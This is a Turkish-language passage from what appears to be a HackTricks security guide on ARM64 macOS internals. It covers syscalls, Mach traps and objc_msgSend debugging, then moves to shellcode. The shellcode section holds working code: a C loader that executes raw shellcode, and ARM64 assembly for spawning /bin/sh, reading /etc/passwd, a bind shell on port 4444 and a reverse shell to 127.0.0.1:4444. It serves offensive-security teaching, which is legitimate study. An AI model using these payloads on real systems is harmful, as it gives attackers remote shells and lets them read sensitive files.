- **`AIF`**: Bazı exception'lar **`A`**, `I`, `F` bit'leri kullanılarak devre dışı bırakılabilir. **`A`** 1 ise **asynchronous abort'lar** tetiklenir. **`I`**, harici donanım **Interrupt Requests**'lerine (IRQ'lar) yanıt verilmesini yapılandırır. `F` ise **Fast Interrupt Requests** (FIR'lar) ile ilgilidir.

## macOS

### BSD syscalls

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) dosyasına bakın veya `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` komutunu çalıştırın. BSD syscall'larında **x16 > 0** olacaktır.

### Mach Traps

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) içinde `mach_trap_table`'a ve [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) içinde prototype'lara bakın. Mach trap'lerinin maksimum sayısı `MACH_TRAP_TABLE_COUNT` = 128'dir. Mach trap'lerinde **x16 < 0** olur; bu nedenle önceki listedeki numaraları **eksi** işaretiyle çağırmanız gerekir: **`_kernelrpc_mach_vm_allocate_trap`**, **`-10`**'dur.

Bu (ve BSD) syscall'larının nasıl çağrıldığını görmek için bir disassembler'da **`libsystem_kernel.dylib`** dosyasını da inceleyebilirsiniz:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Ida ve **Ghidra**'nın cache'i yalnızca cache'i vererek **specific dylibs**'leri decompile edebildiğini unutmayın.

> [!TIP]
> Bazen **`libsystem_kernel.dylib`** dosyasındaki **decompiled** kodu kontrol etmek, **source code**'u kontrol etmekten **daha** kolaydır; çünkü bazı syscall'ların (BSD ve Mach) kodu script'ler aracılığıyla oluşturulur (source code içindeki yorumları kontrol edin), dylib içinde ise neyin çağrıldığını görebilirsiniz.

### machdep calls

XNU, machine dependent olarak adlandırılan başka bir çağrı türünü de destekler. Bu çağrıların numaraları mimariye bağlıdır ve ne çağrıların ne de numaraların sabit kalacağı garanti edilir.

### comm page

Bu, kernel tarafından sahip olunan ve her users process'in address space'ine map edilen bir memory page'dir. Kernel servisleri için user mode'dan kernel space'e geçişi, syscall kullanmaktan daha hızlı hâle getirmek amacıyla tasarlanmıştır; çünkü bu servisler o kadar sık kullanılır ki bu geçişi gerçekleştirmek çok verimsiz olurdu.

Örneğin `gettimeofdate` çağrısı, `timeval` değerini doğrudan comm page'den okur.

### objc_msgSend

Bu function'ı Objective-C veya Swift programlarında kullanılırken görmek son derece yaygındır. Bu function, bir Objective-C object'in method'unu çağırmayı sağlar.

Parameters ([daha fazla bilgi için docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):<sup>[[4]](#references)</sup>

- x0: self -> Instance'a pointer
- x1: op -> Method'un selector'ı
- x2... -> Invoked method'un geri kalan arguments'ları

Dolayısıyla, bu function'a branch etmeden önce breakpoint koyarsanız, aşağıdaki komutla lldb içinde neyin invoked edildiğini kolayca bulabilirsiniz (bu örnekte object, bir command çalıştıracak olan `NSConcreteTask` içindeki bir object'i çağırır):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> **`NSObjCMessageLoggingEnabled=1`** env variable'ı ayarlanarak, bu function'ın çağrıldığı zamanı `/tmp/msgSends-pid` gibi bir file'a loglamak mümkündür.
>
> Ayrıca, **`OBJC_HELP=1`** ayarlanıp herhangi bir binary çağrıldığında, belirli Objc-C action'ları gerçekleştiğinde **log** almak için kullanabileceğiniz diğer environment variable'ları görebilirsiniz.

Bu function çağrıldığında, belirtilen instance'ın çağrılan method'unu bulmak gerekir; bunun için farklı aramalar yapılır:

- Optimistic cache lookup gerçekleştir:
- Başarılıysa tamamlandı
- runtimeLock'u (read) edin
- Eğer (realize && !cls->realized) class'ı realize et
- Eğer (initialize && !cls->initialized) class'ı initialize et
- Class'ın kendi cache'ini dene:
- Başarılıysa tamamlandı
- Class method list'ini dene:
- Bulunursa cache'i doldur ve tamamlandı
- Superclass cache'ini dene:
- Başarılıysa tamamlandı
- Superclass method list'ini dene:
- Bulunursa cache'i doldur ve tamamlandı
- Eğer (resolver) method resolver'ı dene ve class lookup'tan itibaren tekrarla
- Hâlâ buradaysa (= diğer her şey başarısız oldu) forwarder'ı dene

### Shellcodes

Derlemek için:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Byte'ları çıkarmak için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Daha yeni macOS sürümleri için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Shellcode'u test etmek için C kodu</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**Buradan**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) alınmış ve açıklanmıştır.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### cat ile oku

Amaç `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` çalıştırmaktır; bu nedenle ikinci argüman (x1), parametrelerden oluşan bir dizidir (bellekte bu, adreslerin yığını anlamına gelir).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Ana işlem öldürülmesin diye fork üzerinden sh ile komut çağırma
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

[https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) adresindeki **4444 portundaki** Bind shell<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s) adresinden, **127.0.0.1:4444** adresine revshell<sup>[[3]](#references)</sup> gönderir.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Referanslar

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
- [4] [Apple Developer - 712 Objc Msgsend](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)

{{#include ../../../banners/hacktricks-training.md}}
